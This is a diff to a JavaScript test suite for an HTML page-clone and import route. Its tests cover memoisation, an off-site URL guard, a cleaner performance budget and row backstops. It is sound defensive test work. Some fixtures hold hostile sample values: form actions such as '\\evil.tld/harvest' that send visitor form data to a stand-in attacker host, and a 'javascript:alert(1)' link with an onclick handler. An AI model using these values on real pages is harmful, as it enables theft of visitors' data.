@@ -29,8 +29,8 @@ const {
   PAGES_RATE_MAX, PAGES_RATE_WINDOW_SEC, THEME_BUILT_MIN_TEXT,
   BODY_PROBE_BYTES, LIST_BODY_BUDGET_BYTES, LIST_NODE_MAX, SUMMARY_MAX,
 } = mod;
-const { ESCAPE_HATCH_MAX, INPUT_MAX, urlScheme, isAllowedEmbedHost, IFRAME_EMBED_HOSTS } =
-  await import('../../src/routes/pageClone.js');
+const { ESCAPE_HATCH_MAX, INPUT_MAX, urlScheme, isAllowedEmbedHost, IFRAME_EMBED_HOSTS,
+  isOffsiteUrl, resolvedHost, cleanHtml } = await import('../../src/routes/pageClone.js');
 
 let pass = 0, fail = 0;
 const ok = (c, m, x = '') => { if (c) { pass++; console.log(`PASS  ${m}`); } else { fail++; console.log(`FAIL  ${m}  ${x}`); } };
@@ -350,6 +350,37 @@ process.env.PUURE_SHOPIFY_TOKEN = 'shpat_SECRETVALUE';
   await call('/stub/list');
   await call('/stub/list');
   eq(shopCalls, 1, 'memo: a FAILING shop.json is also memoised — a broken decoration cannot re-create the fan-out');
+
+  // NIT — a degraded entry is the myshopify host, not the canonical domain.
+  // The LIST may reuse it (thrown away when the modal closes); an IMPORT may
+  // not, because live_url is what absolutizes asset paths and those absolute
+  // URLs are SAVED into the page. A degraded answer would bake the wrong
+  // canonical host into a page permanently.
+  bumpUser();
+  shopCalls = 0;
+  fetchImpl = routeFetch({
+    shop: () => { shopCalls += 1; return jsonResponse({}, 500); },
+    pages: () => jsonResponse({ pages: [] }),
+    page: () => jsonResponse({ page: { id: 3, title: 'X', handle: 'x', body_html: `<p>${COPY}</p>` } }),
+  });
+  await call('/stub/list');
+  await call('/stub/list');
+  eq(shopCalls, 1, 'degraded-memo: the LIST reuses a degraded answer — it is ephemeral');
+  await call('/stub/import', { page_id: '3' });
+  eq(shopCalls, 2, 'degraded-memo: an IMPORT re-attempts it — its answer is PERSISTED into the page');
+  await call('/stub/import', { page_id: '3' });
+  eq(shopCalls, 3, 'degraded-memo: …every import, for as long as the lookup is degraded');
+  // Once it succeeds, the healthy answer is memoised normally again.
+  bumpUser();
+  shopCalls = 0;
+  fetchImpl = routeFetch({
+    shop: () => { shopCalls += 1; return jsonResponse(SHOP_JSON); },
+    page: () => jsonResponse({ page: { id: 3, title: 'X', handle: 'x', body_html: `<p>${COPY}</p>` } }),
+  });
+  const i1 = await call('/stub/import', { page_id: '3' });
+  await call('/stub/import', { page_id: '3' });
+  eq(shopCalls, 1, 'degraded-memo: a HEALTHY answer is memoised for imports too — no per-import N+1');
+  eq(i1.body?.data?.page?.live_url, 'https://shop.example.com/pages/x', 'degraded-memo: …and it is the canonical domain that gets persisted');
 
   // Rotating the store invalidates it (the memo is keyed on the credential).
   bumpUser();
@@ -849,6 +880,33 @@ process.env.PUURE_SHOPIFY_TOKEN = 'shpat_SECRETVALUE';
   ok(!all.includes('evil-youtube'), 'harden: a look-alike host does not sneak past the allowlist');
   eq(st.iframes_removed, 3, 'harden: evil + look-alike + srcless iframes are counted');
 
+  // A BACKSLASH action is the case a `//` regex cannot see: the string does
+  // not look absolute, and every browser loads it as https://evil.tld/... —
+  // visitor form data leaving for someone else's server, counted as clean.
+  eq(isOffsiteUrl(String.raw`\\evil.tld/harvest`), true, 'offsite: \\\\host is off-site — browsers resolve it as protocol-relative');
+  eq(isOffsiteUrl(String.raw`/\evil.tld/x`), true, 'offsite: a mixed slash/backslash authority is off-site too');
+  eq(isOffsiteUrl(String.raw`\/evil.tld/x`), true, 'offsite: …in either order');
+  eq(isOffsiteUrl('//evil.tld/x'), true, 'offsite: protocol-relative is off-site');
+  eq(isOffsiteUrl('https://evil.tld/x'), true, 'offsite: absolute is off-site');
+  eq(isOffsiteUrl('/local'), false, 'offsite: a relative path is NOT off-site');
+  eq(isOffsiteUrl(String.raw`\local`), false, 'offsite: a single backslash is a path separator, not an authority');
+  eq(isOffsiteUrl('?q=1'), false, 'offsite: a query-only action is NOT off-site');
+  eq(isOffsiteUrl(''), false, 'offsite: an empty action is NOT off-site');
+  eq(isOffsiteUrl('javascript:alert(1)'), false, 'offsite: a javascript: action has no host — the URL-scheme pass owns it');
+  eq(isOffsiteUrl(null), false, 'offsite: null → false, no throw');
+  eq(resolvedHost(String.raw`\\evil.tld/harvest`), 'evil.tld', 'offsite: the host is read by the URL PARSER, not a pattern');
+
+  {
+    const backslash = `<section>${COPY}<form action="${String.raw`\\evil.tld/harvest`}"><input name="email"></form></section>`;
+    fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 6, title: 'B', handle: 'b', body_html: backslash } }) });
+    const br = await call('/stub/import', { page_id: '6' });
+    const bAll = (br.body?.data?.sections || []).map((s) => s.html).join('\n');
+    eq(br.body?.data?.stats?.forms_neutralized, 1, 'backslash form: COUNTED as neutralized (was 0 — the guard was a forward-slash regex)');
+    ok(!/\saction\s*=/i.test(bAll), 'backslash form: the live action attribute is gone', bAll.match(/<form[^>]*>/)?.[0]);
+    ok(bAll.includes('data-original-action='), 'backslash form: …preserved inertly');
+    ok(bAll.includes('name="email"'), 'backslash form: the form itself survives');
+  }
+
   ok(!/\saction\s*=\s*["']?https:\/\/evil\.com/i.test(all),
     'harden: the off-site form action is gone (anchored on an attribute boundary — data-original-action must not satisfy this)',
     all.match(/[a-z-]*action\s*=\s*"[^"]*"/gi)?.join(' | '));
@@ -867,6 +925,54 @@ process.env.PUURE_SHOPIFY_TOKEN = 'shpat_SECRETVALUE';
     [0, 0, 0, 0],
     'harden: a clean page reports every counter as 0, not undefined'
   );
+}
+
+// ---- M4-PERF: THE SHARED CLEANER HAS A PINNED BUDGET ---------------------
+// cleanHtml runs on POST /page-clone/scan — paste and upload — in the process
+// that serves live checkout. Compiling a regex per URL attribute per tag made
+// it 1,109 ms for a 10MB / ~414k-tag document, i.e. exactly the event-loop
+// block B1 was raised for, on a route the operator can hit directly. The
+// budget is pinned HERE, the way LIST_BODY_BUDGET_BYTES is, so it cannot
+// silently regress.
+const CLEAN_HTML_BUDGET_MS = 600;
+{
+  bumpUser();
+  const unit = '<div class="c" data-x="1"><a href="/p">t</a><img src="/i.png" alt="a"></div>';
+  const big = unit.repeat(Math.floor(INPUT_MAX / unit.length));
+  const bytes = Buffer.byteLength(big, 'utf8');
+  ok(bytes > INPUT_MAX * 0.99, 'clean-perf: the fixture really is at the 10MB scan ceiling', String(bytes));
+
+  const t0 = process.hrtime.bigint();
+  const { stats } = cleanHtml(big);
+  const ms = Number(process.hrtime.bigint() - t0) / 1e6;
+  ok(ms < CLEAN_HTML_BUDGET_MS,
+    `clean-perf: ${(bytes / 1048576).toFixed(0)}MB / ~${Math.floor(big.length / unit.length) * 3} tags cleaned in ${ms.toFixed(0)}ms (budget ${CLEAN_HTML_BUDGET_MS}ms) — was 1,109ms with a per-attribute regex built per tag`,
+    `${ms.toFixed(0)}ms`);
+  // …and it is still doing the work, not short-circuiting to look fast.
+  eq(
+    [stats.handlers_stripped, stats.unsafe_urls_stripped, stats.iframes_removed, stats.forms_neutralized],
+    [0, 0, 0, 0],
+    'clean-perf: the hardening pass really ran over the fixture (clean input → all zeros)'
+  );
+  const spiked = `${unit.repeat(200)}<a href="javascript:alert(1)" onclick="x()">z</a>${unit.repeat(200)}`;
+  const sp = cleanHtml(spiked).stats;
+  eq([sp.handlers_stripped, sp.unsafe_urls_stripped], [1, 1],
+    'clean-perf: …and still finds a needle buried in 400 clean tags');
+}
+
+// ---- NIT: A BACKSTOPPED ROW ADMITS IT WAS NOT DERIVED --------------------
+{
+  bumpUser();
+  // Force the budget backstop with rows whose probed bytes exceed it.
+  const fat = 'x'.repeat(BODY_PROBE_BYTES);
+  const many = Math.ceil(LIST_BODY_BUDGET_BYTES / BODY_PROBE_BYTES) + 2;
+  const rows = Array.from({ length: many }, (_, i) => ({ id: i + 1, handle: `h${i}`, body_html: `<p>${fat}</p>` }));
+  const mapped = mapPageRows(rows, 'https://s.com');
+  eq(mapped.length, many, 'backstop: every row is still listed');
+  eq(mapped[0].is_theme_built, false, 'backstop: a DERIVED row carries a real boolean');
+  eq(mapped[many - 1].is_theme_built, null,
+    'backstop: an UNDERIVED row reports null — "not derived" — never a false that claims the page has content');
+  eq(mapped[many - 1].summary, '', 'backstop: …and no summary is invented for it');
 }
 
 // ---- m1: `fields` RIDES EVERY CURSOR HOP ---------------------------------
